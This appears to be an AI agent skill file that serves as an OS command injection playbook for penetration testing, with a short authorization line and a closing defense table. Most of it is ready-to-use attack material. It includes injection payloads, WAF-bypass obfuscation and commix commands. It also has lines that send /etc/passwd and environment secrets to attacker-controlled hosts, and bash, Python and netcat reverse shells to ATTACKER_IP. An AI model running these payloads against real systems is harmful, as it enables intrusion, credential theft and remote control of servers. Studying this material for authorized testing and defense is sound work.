---
id: command-injection
name: command-injection
description: >
  OS command injection specialist for authorized penetration tests. Covers blind OOB
  detection (nslookup/curl/ping callbacks), time-based blind injection, out-of-band
  exfiltration, all shell metacharacters, WAF bypass techniques, commix tool usage,
  and language-specific sinks in PHP/Python/Node.js/Ruby/Java. Triggers on: command
  injection, OS command injection, blind command injection, commix, shell metachar,
  RCE via command injection, PHP system(), subprocess injection, child_process exec.
triggers:
  - command injection
  - OS command injection
  - blind command injection
  - commix
  - shell metacharacter
  - RCE command injection
  - PHP system injection
  - subprocess injection
  - child_process exec
  - bash injection
  - ping injection
  - sleep injection
---

# OS Command Injection Specialist

## Authorization Gate

STOP. Confirm written authorization before any command injection testing. All TARGET
references are placeholders — substitute only in-scope systems. OOB callbacks require
attacker-controlled infrastructure.

---

## 1. Command Injection Fundamentals

Command injection occurs when user-controlled input is passed to a system shell without
proper sanitization. The application executes attacker-supplied commands in the context
of the web server process.

### 1.1 Shell Metacharacters

```
;       Command separator (bash/sh) — executes next command regardless
&&      Execute second only if first succeeds (AND)
||      Execute second only if first fails (OR)
|       Pipe — stdout of first becomes stdin of second
$(...)  Command substitution — output inline
`...`   Command substitution (backtick — legacy)
>       Redirect stdout to file
>>      Append stdout to file
<       Redirect file to stdin
&       Run in background
\n      Newline — may work as command separator
%0a     URL-encoded newline
```

### 1.2 Quick Detection Probes

```bash
# Inject each metacharacter into every parameter
# Start with least-destructive: sleep for timing, then ping/nslookup for OOB

# Timing probe (blind — no output needed)
; sleep 5
& sleep 5
| sleep 5
$(sleep 5)
`sleep 5`
%26sleep+5
%7Csleep+5

# Benign output probe (if reflected)
; echo vulnerable_ci_test_12345
| echo vulnerable_ci_test_12345
$(echo vulnerable_ci_test_12345)

# Concatenation in command context
' ; echo vulnerable_ci_test_12345 ; '
" ; echo vulnerable_ci_test_12345 ; "
```

---

## 2. Blind Command Injection — Time-Based

### 2.1 Sleep-Based Detection

```bash
# Baseline the response time first (normal request)
time curl -s -X POST https://TARGET/api/ping \
  -d 'host=127.0.0.1'

# Inject sleep — compare response time
time curl -s -X POST https://TARGET/api/ping \
  -d 'host=127.0.0.1; sleep 5'

time curl -s -X POST https://TARGET/api/ping \
  -d 'host=127.0.0.1%3Bsleep+5'

time curl -s -X POST https://TARGET/api/ping \
  -d 'host=127.0.0.1%26%26sleep+5'

# Windows equivalent (if IIS/.NET target)
time curl -s -X POST https://TARGET/api/ping \
  -d 'host=127.0.0.1 & timeout /t 5'

time curl -s -X POST https://TARGET/api/ping \
  -d 'host=127.0.0.1 & ping -n 5 127.0.0.1'
```

### 2.2 Boolean-Based Blind (Conditional Timing)

```bash
# True condition — should sleep
curl -s -X POST https://TARGET/api/ping \
  -d 'host=127.0.0.1; if [ $(id -u) -eq 0 ]; then sleep 5; fi'

# False condition — should NOT sleep (confirms logic execution)
curl -s -X POST https://TARGET/api/ping \
  -d 'host=127.0.0.1; if [ $(id -u) -eq 999 ]; then sleep 5; fi'

# Exfil single char via timing (binary search on /etc/passwd)
# True if first char of /etc/passwd is 'r'
curl -s -X POST https://TARGET/api/ping \
  -d 'host=127.0.0.1; if [ "$(cut -c1 /etc/passwd)" = "r" ]; then sleep 5; fi'
```

---

## 3. Blind Command Injection — OOB (Out-of-Band)

### 3.1 DNS Callback

```bash
# DNS lookup proves code execution without reflecting output
# Setup: interactsh-client or Burp Collaborator

COLLAB="ATTACKER.interactsh.com"

# nslookup (available on almost all systems)
curl -s -X POST https://TARGET/api/ping \
  -d "host=127.0.0.1; nslookup $COLLAB"

# ping DNS resolution
curl -s -X POST https://TARGET/api/ping \
  -d "host=127.0.0.1; ping -c1 $COLLAB"

# curl (Linux)
curl -s -X POST https://TARGET/api/ping \
  -d "host=127.0.0.1; curl http://$COLLAB/ci-$(whoami)"

# wget
curl -s -X POST https://TARGET/api/ping \
  -d "host=127.0.0.1; wget -q http://$COLLAB/ci-$(id)"

# Windows PowerShell via command injection
curl -s -X POST https://TARGET/api/ping \
  -d "host=127.0.0.1 & powershell -c \"Invoke-WebRequest http://$COLLAB/\$(whoami)\""
```

### 3.2 Data Exfiltration via DNS

```bash
# Exfiltrate file content via DNS subdomain (max 63 chars per label)
COLLAB="ATTACKER.interactsh.com"

# Exfil /etc/passwd first line via DNS
curl -s -X POST https://TARGET/api/ping \
  -d "host=127.0.0.1; nslookup \$(head -1 /etc/passwd | xxd -p | tr -d '\n' | cut -c1-60).$COLLAB"

# Exfil environment variables
curl -s -X POST https://TARGET/api/ping \
  -d "host=127.0.0.1; nslookup \$(env | grep -i key | base64 | tr -d '\n' | cut -c1-60).$COLLAB"

# Exfil via HTTP (more data, longer)
curl -s -X POST https://TARGET/api/ping \
  -d "host=127.0.0.1; curl \"http://$COLLAB/exfil?\$(cat /etc/passwd | base64 | tr -d '\n')\""

# Alternative: exfil to attacker HTTP server
curl -s -X POST https://TARGET/api/ping \
  -d 'host=127.0.0.1; curl -X POST http://ATTACKER:8080/exfil -d "data=$(cat /etc/passwd | base64)"'
```

### 3.3 Interactive Reverse Shell via Command Injection

```bash
# After confirming blind CI — pop reverse shell
ATTACKER_IP="ATTACKER_IP"
ATTACKER_PORT="4444"

# Start listener
nc -lvnp 4444

# Bash reverse shell
curl -s -X POST https://TARGET/api/ping \
  -d "host=127.0.0.1; bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1"

# Encoded to avoid metachar issues
B64=$(echo "bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1" | base64)
curl -s -X POST https://TARGET/api/ping \
  -d "host=127.0.0.1; echo $B64 | base64 -d | bash"

# Python reverse shell (if bash is blocked)
curl -s -X POST https://TARGET/api/ping \
  -d "host=127.0.0.1; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$ATTACKER_IP\",$ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"

# Netcat reverse shell
curl -s -X POST https://TARGET/api/ping \
  -d "host=127.0.0.1; nc -e /bin/bash $ATTACKER_IP $ATTACKER_PORT"

# mkfifo variant (when -e not available)
curl -s -X POST https://TARGET/api/ping \
  -d "host=127.0.0.1; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $ATTACKER_IP $ATTACKER_PORT >/tmp/f"
```

---

## 4. WAF Bypass Techniques for Command Injection

### 4.1 Space Bypass

```bash
# IFS (Internal Field Separator) as space substitute
cmd='cat${IFS}/etc/passwd'
cmd='cat${IFS%/}${IFS#?}/etc/passwd'

# Brace expansion  
cmd='{cat,/etc/passwd}'

# Tab as space (%09)
cmd='cat%09/etc/passwd'

# Redirections
cmd='cat</etc/passwd'

# $() nesting
cmd='$(printf${IFS}"cat /etc/passwd" | bash)'
```

### 4.2 Keyword Bypass

```bash
# cat alternatives
cat /etc/passwd
less /etc/passwd
more /etc/passwd
head /etc/passwd
tail /etc/passwd
tac /etc/passwd      # reverse cat
nl /etc/passwd       # with line numbers
od -c /etc/passwd    # octal dump
xxd /etc/passwd      # hex dump
base64 /etc/passwd   # base64 encode

# Concatenation bypass
cat /etc/'p'asswd
cat /etc/pa'ss'wd
cat /etc/passw'd'

# Variable bypass
a=cat; b=/etc/passwd; $a $b
a=c; b=at; $a$b /etc/passwd

# Escape characters
c\at /etc/passwd
\c\a\t /etc/passwd
'c'a't /etc/passwd

# Wildcards
cat /etc/pa??wd
cat /etc/pass*
cat /???/passwd
cat /e??/?asswd
```

### 4.3 Encoding and Obfuscation

```bash
# Hex encoding
$(printf '\x63\x61\x74')${IFS}'/etc/passwd'

# Octal encoding
$(printf '\143\141\164')${IFS}/etc/passwd

# Base64 decode and execute
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash

# Reverse string
$(rev<<<'dwssap/cte/ tac')

# Double URL encoding (WAF decodes once, app decodes twice)
# ;  = %3B  = %253B (double encoded)
curl -s -X POST https://TARGET/api/ping \
  -d 'host=127.0.0.1%253Bsleep+5'
```

---

## 5. Commix — Automated Command Injection

```bash
# https://github.com/commixproject/commix

# Basic scan
commix --url="https://TARGET/api/ping" --data="host=127.0.0.1" --batch

# GET parameter
commix --url="https://TARGET/lookup?host=127.0.0.1" --batch

# With auth cookie
commix --url="https://TARGET/api/ping" \
  --data="host=127.0.0.1" \
  --cookie="session=SESSION_TOKEN" \
  --batch

# Custom header injection
commix --url="https://TARGET/api/ping" \
  --data="host=127.0.0.1" \
  --headers="X-Custom-Header: INJECT_HERE" \
  --batch

# All injection techniques
commix --url="https://TARGET/api/ping" \
  --data="host=127.0.0.1" \
  --technique=all \
  --batch

# Time-based only (when output not reflected)
commix --url="https://TARGET/api/ping" \
  --data="host=127.0.0.1" \
  --technique=time \
  --batch

# OOB via DNS
commix --url="https://TARGET/api/ping" \
  --data="host=127.0.0.1" \
  --dns-server=ATTACKER_IP \
  --batch

# Specific OS shell
commix --url="https://TARGET/api/ping" \
  --data="host=127.0.0.1" \
  --os-shell \
  --batch
```

---

## 6. Language-Specific Sinks

### 6.1 PHP Sinks

```php
// Vulnerable functions to look for in code review
system($input);
exec($input);
passthru($input);
shell_exec($input);
popen($input, 'r');
proc_open($input, ...);
`$input`;  // backtick operator
pcntl_exec("/bin/sh", ["-c", $input]);
preg_replace('/.*/e', $input, '');  // /e modifier (PHP < 7)
assert($input);  // if input is a string

// Common patterns in real code
$host = $_GET['host'];
system("ping -c 4 " . $host);  // VULNERABLE

// Look for these in source review:
grep -r "system\|exec\|passthru\|shell_exec\|popen\|proc_open\|\`\$" . --include="*.php"
```

### 6.2 Python Sinks

```python
import os, subprocess

# Vulnerable patterns
os.system(user_input)
os.popen(user_input)
subprocess.call(user_input, shell=True)   # shell=True is the trigger
subprocess.run(user_input, shell=True)    # VULNERABLE
subprocess.Popen(user_input, shell=True)  # VULNERABLE
eval(user_input)
exec(user_input)

# SAFE alternatives (list args, no shell=True)
subprocess.run(['ping', '-c', '4', user_input])  # SAFE — no shell
subprocess.run(['ls', user_input], shell=False)   # SAFE

# Source review grep
grep -r "shell=True\|os\.system\|os\.popen\|eval\|exec" . --include="*.py"
```

### 6.3 Node.js Sinks

```javascript
// Vulnerable patterns
const { exec, execSync, spawn } = require('child_process');

exec(`ping -c 4 ${userInput}`, callback);      // VULNERABLE
execSync(`ls ${userInput}`);                   // VULNERABLE
exec(userInput, callback);                     // VULNERABLE

// eval and Function constructor
eval(userInput);
new Function(userInput)();

// Less obvious
require('child_process').exec('cmd ' + req.query.param);

// Source review
grep -r "exec\|execSync\|spawn\|eval\|Function(" . --include="*.js" --include="*.ts"
```

### 6.4 Ruby Sinks

```ruby
# Vulnerable patterns
system(user_input)
`#{user_input}`          # backtick interpolation
exec(user_input)
IO.popen(user_input)
eval(user_input)
Kernel.system(user_input)
%x{#{user_input}}        # %x interpolation

# Source review
grep -r "system\|exec\|popen\|eval\|Kernel\.\|%x{" . --include="*.rb"
```

### 6.5 Java Sinks

```java
// Vulnerable patterns
Runtime.getRuntime().exec(userInput);
Runtime.getRuntime().exec(new String[]{"bash", "-c", userInput});
ProcessBuilder pb = new ProcessBuilder("bash", "-c", userInput);
pb.start();

// Spring Expression Language (SpEL) injection
// @Value("#{${userInput}}")
// Expression exp = parser.parseExpression(userInput);

// Source review
grep -r "Runtime.getRuntime\|ProcessBuilder\|parseExpression\|SpelExpression" . --include="*.java"
```

---

## 7. Context-Specific Injection Points

### 7.1 HTTP Headers

```bash
# User-Agent injection
curl -s -X GET "https://TARGET/page" \
  -H "User-Agent: Mozilla/5.0; $(sleep 5)"

# X-Forwarded-For injection
curl -s -X GET "https://TARGET/page" \
  -H "X-Forwarded-For: 127.0.0.1; sleep 5"

# Referer injection
curl -s -X GET "https://TARGET/page" \
  -H "Referer: https://TARGET/; $(sleep 5)"

# Host header injection
curl -s -X GET "https://TARGET/page" \
  -H "Host: TARGET; $(sleep 5)"
```

### 7.2 File Names

```bash
# If server processes uploaded filenames via shell
# Filename: "test; curl http://ATTACKER/$(id).txt"
# Filename: "; touch /tmp/pwned.txt"
# Filename: "$(curl http://ATTACKER/$(id))"

python3 << 'EOF'
import requests

# Upload with malicious filename
files = {
    'file': ('; curl http://ATTACKER/$(id)', b'file content', 'text/plain')
}
r = requests.post('https://TARGET/upload', files=files)
print(r.text)
EOF
```

### 7.3 Email and Name Fields

```bash
# Command injection in email fields processed server-side (Sendmail, exim)
# Sendmail uses -f flag which passes to shell in old configs
# Vulnerable: mail('admin@target.com', 'Subject', 'Body', "From: {$email}");

# Inject via email field
curl -s -X POST https://TARGET/contact \
  -d 'email=attacker@evil.com|sleep+5&message=test'

# Less obvious — name field used in mail() headers
curl -s -X POST https://TARGET/contact \
  -d 'name=$(sleep 5)&email=test@test.com&message=test'
```

---

## 8. Full Testing Checklist

```
[ ] Identify all parameters (GET, POST, headers, cookies, JSON fields)
[ ] Baseline response time for each endpoint
[ ] Test sleep/timeout for blind CI detection
[ ] Test OOB callback (DNS/HTTP) for confirmation
[ ] Try all metacharacters: ; | & $() `` || && %0a %0d
[ ] Test encoded variants: URL, double URL, hex, base64
[ ] Test WAF bypass: space substitutes, keyword alternates
[ ] Confirm execution context (user, OS, cwd via id/whoami)
[ ] Attempt file read (/etc/passwd, wp-config.php, .env)
[ ] Attempt reverse shell
[ ] Test language-specific sinks if source available
[ ] Run commix for automated coverage
[ ] Document CVSS score (base: likely 9.8 Critical)
```

---

## 9. Defense and Detection

| Technique | Detection Signal | Hardening Fix |
|---|---|---|
| Sleep injection | Unusual response latency spikes | WAF time-based anomaly; avoid shell calls entirely |
| DNS OOB | Unexpected DNS queries to external | Egress firewall; DNS monitoring (anomaly detection) |
| Metachar injection | Semicolons/pipes in params | Input validation — allowlist chars, not blocklist |
| curl/wget callback | Unexpected outbound HTTP to unknown IP | Egress firewall rules; no-internet for web process |
| Reverse shell | Outbound TCP on non-standard ports | Egress firewall; seccomp profiles; containers |
| PHP system() call | Web process spawning /bin/sh | Application-level: use escapeshellarg(); review code |

### Remediation Code

```php
// PHP — use escapeshellarg() for arguments, escapeshellcmd() for full commands
$safe_host = escapeshellarg($_GET['host']);
system("ping -c 4 " . $safe_host);  // Safer — but best is to avoid shell entirely

// Better: use native PHP functions, avoid shell
$ip = filter_var($_GET['host'], FILTER_VALIDATE_IP);
if (!$ip) die("Invalid IP");
```

```python
# Python — NEVER use shell=True with user input
# SAFE: pass as list
subprocess.run(['ping', '-c', '4', user_ip])  # Validated IP first

# Validate input strictly
import ipaddress
try:
    ipaddress.ip_address(user_input)  # Raises ValueError if not valid IP
except ValueError:
    return "Invalid IP"
```

---

## Related Skills

- `rce-specialist` — extending command injection to full shells and persistence
- `waf-bypass-techniques` — advanced WAF evasion for injection payloads
- `xxe-specialist` — XXE as alternative code execution path
- `sqli-specialist` — SQL injection with OS command execution (xp_cmdshell, COPY TO)
- `recon-specialist` — finding injection points in recon phase
